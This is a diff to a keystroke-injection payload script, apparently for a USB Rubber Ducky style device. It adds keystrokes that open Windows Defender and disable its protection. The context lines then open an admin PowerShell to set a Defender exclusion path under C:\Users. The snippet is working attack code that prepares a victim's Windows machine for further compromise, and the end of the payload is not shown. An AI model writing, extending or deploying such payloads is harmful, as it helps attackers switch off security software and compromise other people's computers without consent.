@@ -6,6 +6,27 @@ REM --------------set default delay based on targets computer speed, 350 is arou
 DEFAULT_DELAY 350
 REM -------------first delay is 1 second (you may need more) to let windows set up the "keyboard"
 DELAY 1000
+REM disable windows defender, you may have to fiddle with this 
+CTRL ESC
+DELAY 300
+STRING windows defender
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 600
+SPACE
+DELAY 600
+LEFT
+ENTER
+DELAY 300
+ALT F4
 REM ------------open powershell as admin and set an exclusion path in the C:\Users path
 GUI r
 STRING powershell
